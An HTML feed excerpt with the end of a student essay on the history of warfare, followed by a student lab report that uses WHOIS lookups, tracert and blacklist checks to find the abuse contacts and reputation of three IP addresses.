one hundred, one thousand and ten thousand. Heavily equipped with
weapons, which are: Thrusting Spear, palta, Akinakes , Xiphos, kopis,
bow etc (Wildfiregames, 2004).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Greece war, first nine years of the war consisted of both war in Troy
and war against the neighbouring regions, where destroyed Trojan
economy, allowed Greeks to getter a large amount of resources. The
Greeks won most of the battles, but they still could not break the walls
of Troy. The weapons that were used in those battles were bows and
arrows. As for strategies the famous Trojan horse, when Odysseus had a
perfect idea to build a big wooden horse where inside will be field with
the soldiers, which bring and invasion of Troy from the Greeks (Rita,
2010).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Army of Macedonia was the army of ancient Kingdom of Macedonia. It
considers a grate military force where there were reforms constructed
from the suggestion of King Philip II of Macedon and then his son
Alexander the Great. The introduction was in innovation of weapons and
new tactics, along with unique elements combination of military
elements, which bring a great intercontinental empire (Ellis, 1979).
Philip II had implemented in Macedonian phalanx army separation which
one group were on a mission to conquer a city and the other to conquer
castles. Each phalangite carried as his primary weapon a sarissa, but
the phalangite were not the focal point for the battle, they have used
other forces like: skirmishers, range troops, reserves of allied
hoplites, and artillery (Hellenica, 2005).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Rome in the wars had adapted weapons, armour and tactics of many enemies
they fought. Main weapons of Rome soldiers were Spanish sword – gladius,
it had two throwing spears, a large shield, body armour and a helmet.
They have also operated with the fire supported weapons, scorpios,
carroballistas, onagers. For a fest moves they started to build bridges,
so that the soldiers and the army can move faster. The army can march up
to 30 km a day. They were very evil, trained to stab a 5 cm deep wound,
after breaking the enemy, Romans tended to kill as many enemies as
possible and their cavalry pursued fleeing enemy.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;After the Rome the medieval Europe warfare followed, which was the war
of legal and acceptable justification, nobility (knights) and the main
force on the battlefield was a heavy cavalry, where the law of the armed
conflict was born. The second largest empire in human history was the
Mongol empire. Mongols army had the capacity to move up to 150 km a day.
The weapons of the army consisted of massive fire (bow) speed and
manoeuvres.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Wars of the XVI Century were mostly protracted and indecisive. There was
insistency on building a fortress that was very difficult to conquer.
The most important improvement is the side of the weapons with adoption
of light guns and gunpowder. Gustavus Adolphus had guns in his army, he
had 1 gun per 83, but his enemies had 1 gun per 2000 men. The main thing
was to build and modify the fortresses for safety and hard to conquer.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;World War I, sometimes described as ‘the war to end all wars’ (Creveld,
2000, p. 162), the strategies were based on first manoeuvre, and then
attrition. Forces and armaments were infantry, cavalry artillery, and
surface navy (initially); later – tanks, planes, submarines, chemical
weapons. The tactics were manoeuvre, frontal assaults, fortified
defence, artillery concentration (initially); the theoretical thinking:
seeking the way out of dead end, but not finding the means and ways. The
first known bombardment from the sky, using airplanes was by Bulgarian
army on the 16 of October 1912 at battle of Adrianople, where they were
captivated by the Turkish army. From the German newspaper “Geschichte
des Luftkriegs”, Militarverlag der DDR, Berlin, 1975, though the 1912
United Kingdom had 23 air planes, Russian – 99, German – 46, Italian –
22, Japan – 10 and USA – 3 air planes.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Second World War, where the technology and the concept of the war were
getting bigger, developed into a prolonged and extremely deadly struggle
of attrition. The Germans invented the rockets (vau1 and vau2).
Hiroshima and Nagasaki are the first and only events of deployments of
nuclear weapons in the world.  &lt;/p&gt;
&lt;p&gt;Second half of the 20th century, after the valuable technical point, the
arms forward for an outbreak of terrorism. That means that wars are no
longer big and global; the enemy is no longer in uniforman in force. And
size is no longer as great as it was the enemy can attack from anywhere.
Therefore, no longer wars head-do met the two armies, but running by
partisan / guerillas. Terrorism is an unconventional war de facto, i.e.
anti-insurgent operation, i.e. counter insurgency. Which create the kind
of combat actions that are performed nowadays in Afghanistan and Iraq.
In the 20th century, has one goal, redistribution of resources, i.e. to
get to justify the need to test before the war for democracy and human
rights. Macedonia is the country that is inclined towards terrorism, the
early 20th century, April 28 1903rd in Thessaloniki, the boatmen of
Thessaloniki have committed terrorist actions against the capital of
Western Europe and Turkey, i.e. have planted bombs in the Ottoman Bank
in Thessaloniki, the main post office, and planted a bomb in a ship
(Sotros, 2004 December).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;As can read above the changes are very drastic. Humanity is fighting for
the different purpose; starting from the antiquity to nowadays, not only
in weapons that were used and presented, but in the strategies in a
tactics and theoretical thinking. Therefore, there are no more battles
wars, people are grouping and they can embattle from anywhere, which
gives a content of the terroristic activities of the wars. Today the
humanity and the scholars should getter together to work around of the
problems and solutions for the future, possibilities of internet (social
networks, VOIP, IM etc.), net generations1, thus today it is the main
source of grouping the population for massive protests or any other
actions, which can end-up to a war or scandal.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Consequently the technology and science are rising, the possibilities
and the changes in an aspect of wars will change. For instant is Russian
– Georgian conflict in 2008 as a result of territorial attack and in
sequence with it there was an cyber-attack in progress2; or powerful
internet worm repeatedly targeted five nuclear industrial facilities in
Iran and many others3. Therefore, nowadays this actions and concept of
warfare is different, no more uniforms, battles etc. Warfare’s are
getting new aspect and new ways to approach through the technology.&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The main goal of laboratory report is to identify the responsibilities
for the IP addresses below and how we can make connection to them. IP
addresses are randomly chosen by the lecture.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;IP addresses:&lt;/p&gt;
&lt;p&gt;​1. 69.163.171.238&lt;/p&gt;
&lt;p&gt;​2. 31.44.184.101&lt;/p&gt;
&lt;p&gt;​3. 188.72.228.69 …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;PURPOSE&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The main goal of laboratory report is to identify the responsibilities
for the IP addresses below and how we can make connection to them. IP
addresses are randomly chosen by the lecture.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;IP addresses:&lt;/p&gt;
&lt;p&gt;​1. 69.163.171.238&lt;/p&gt;
&lt;p&gt;​2. 31.44.184.101&lt;/p&gt;
&lt;p&gt;​3. 188.72.228.69&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;External IP that is used for purpose of this test is following:
193.40.244.0/255 1. The ISP that provides this network is EENet2.
Organization that is behind is Tallinn Technical University, Estonia.
City location is Tallinn and the region is Harjumaa. The phone number of
my ISP is: +372 73&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;. The e-mail we should report abuse are: first
persons that is in charge: Viktor Borisevitch (e-mail:&lt;/strong&gt;tor at cc.ttu.ee
and phone number: +372-2-&lt;strong&gt;&lt;em&gt;*46) and Andres Lepp (e-mail: l&lt;/em&gt;&lt;/strong&gt; at
cc.ttu.ee and phone number: +372 6 &lt;strong&gt;*&lt;/strong&gt;55). In addition, if we wont to
submit an abuse we should use both persons of network administration and
then we can submit and security incident on the following ISP e-mail:
turvas@eeenet.ee [RIPE NCC].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;All in all, Method 1 and Appendix 1 describes the website, tools and
application that are used to conduct this laboratory report. In
addition, Method 2 and Appendix 2 will introduce website tools and
databases where we can check if following IP’s have been reported before
as abuse and security risk. Both methods are represented with answer and
consequences confront in the result section.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally the conclusion made of all collected data will be concise in
conclusion section of this report.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;METHODS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;First method describes and demonstrates web tools that have been used to
collect the needed information from the stated IP’s addresses. Second
method is pointing out website tools and databases that can be applied
if the IP has been reported previously as a abuse, spam or security
threat.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;METHOD 1&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Firstly, we need to collect as much as we can details about the IP
address. In Appendix 1 is showing the wholly information of the IP’s,
contact details, organization name, address, location, state, country,
technicians contact, abuse phone number, abuse e-mail, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Depending on the location of IP we should make sure that not only we
know the ISP or abuse contact details, but we should know national CERT
3 agency that is in charge too. Therefore, to collect the information we
have used different web sites, agencies: [RIPENCC, LACNIC, AfriNIC,
APNIC, ARIN]. The above reference are agencies collected from IANA4.
Authority responsible for global coordination of the Internet Protocol
addressing systems [IANA].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, to have more details about the route of the IP’s we are using
command prompt in Windows 7 with the following command, where the
results are presented in Appendix 2 section:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    tracert [0.0.0.0]To illustrate, the details information are presented in Result 1 section.

&lt;/div&gt;

&lt;/p&gt;

&lt;h2&gt;METHOD 2&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;After we have collected the wholly information about the concrete IP
proposals, we should check if in addition those IP’s previously have
been reported as abused, spam or security threat. To complete the
following method we need to check concrete database system that is
offering following service. First that crossed on web is [MalwareURL]
which is dedicated to fighting malware, trojans and a multitude of other
web-related threats. In addition, we can check if the IP addresses are
listed in anti-spam databases. With other words blacklist check
[MyIPAddress].&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;RESULTS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Results from Method 1 are presented in Result 1, further Method 2 is
presented in Result 2.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;RESULT 1&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;For each IP are presented only the most important data details that we
need to collect for our goal. In addition, full description and details
are presented in Appendix 1. The tables bellow are illustrating the most
important information that we should look-for. In addition, the
highlighted lines are indicating the abuse e-mail box that should be
send mail too.&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    69.163.171.238OrgName: New Dream Network, LLCAddress: 417 Associated Rd.Address: PMB #257City: BreaStateProv: CAPostalCode: 92821Country: US#technician in chargeOrgTechName: Nagel, MarkOrgTechPhone: +1-714-706-4182OrgTechEmail: mna47-arin at dreamhost.com#abuse in chargeOrgAbuseName: DreamHost Abuse TeamOrgAbusePhone: +1-714-706-4182OrgAbuseEmail: abuse&amp;nbsp; at dreamhost.comTable 131.44.184.101person: Chris Burnsaddress: Building 4&gt;address: City West Office Parkaddress: Gelderd Roadaddress: Leeds LS12 6LXaddress: Englandphone: +44-208-901-2332#abuse e-mail: abuse-mailbox: abuse at laveconetworks.co.ukTable 288.72.228.69role: Mannesmann Arcor Network Operation Centeraddress: Arcor AG &amp;amp; Co.

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;However, now that we know the abuse e-mail, phone number and contact
person details, still is this information enough for us. If we look in
details all of the IP’s are from different countries. Therefore we need
to find what is the national CERT agency contact details. First table is
based in USA, therefore we need to use their reporting system, which is
locate in the following link: &lt;a href="http://www.us-cert.gov/"&gt;http://www.us-cert.gov/&lt;/a&gt; . Second table
is UK, the national CERT agency link:
&lt;a href="http://www.ukcert.org.uk/"&gt;www.ukcert.org.uk&lt;/a&gt;. Third table is based in
Germany, the CERT agency link: &lt;a href="http://www.cert-verbund.de/"&gt;http://www.cert-verbund.de/&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;From the routing trace we can conclude that the first IP and the third
respond and it did not miss route trace, where in the second IP,
31.44.184.101 there is miss route trace.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;That is why we will run this IP address to Method 2. Despite the fact,
still we will run the rest of IP’s in the Method 2, to be trusted that
are not in the abuse list.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;RESULT 2&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Next step is to attempt to search the IP address to check if they have
been previously report as a abuse, trojan, malware, security threat,
etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;To check and verify the security status we are using the service
available [MalwareURL]. Where results for 69.163.171.238 and
88.72.228.69 are with status that have not been previously reported as
abuse. On the other hand, 31.44.184.101 IP address is detected as an
security threat before. More details are presented in Appendix 3. Where
is demonstrating that the
&lt;code&gt;/404.php?type=stats&amp;amp;amp;affid=531&amp;amp;amp;subid=03&amp;amp;amp;iruns&lt;/code&gt; has been
reported as malicious URL and it is in a blacklist of Google, MyWOT,
etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Not only that it is listed in the malware database list, but also if we
double check on service [MyIPAddress] that the 31.44.184.101 IP address
is listed in few blacklist which is assess by DNSBL5.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;CONCLUSION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;In conclusion, I would like to reiterate that the concrete IP’s that we
analysis in this report are demonstrating the process and methods that
should be done in future to detect, report abuse, malware, threat,
trojan, security risk, etc. Where we should gather the detail
information, and to whom to turn the abuse. To be precise that are not
in blacklist, spam list, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In spite of following IP’s: 69.163.171.238 and 88.72.228.69, from
performing methods and delivering results are safe and secure, still
think can be exploited in easy manners. The opposite, IP address
31.44.184.101 it has been already report infected as malicious code from
few blacklist providers. When checking the DNS, host name is linking to
UK company that deals with IP Transit. For further information please
check the following link: &lt;a href="http://www.laveconetworks.co.uk/"&gt;http://www.laveconetworks.co.uk/&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In general, hope that laboratory report and the analyse will help to
anyone else to guide them for future use.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;APPENDIXES&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Appendix 1 is list of details collected from service. Appendix 2 is
trace route details. Where Appendix 3 is the result collected from the
black list database.&lt;/p&gt;
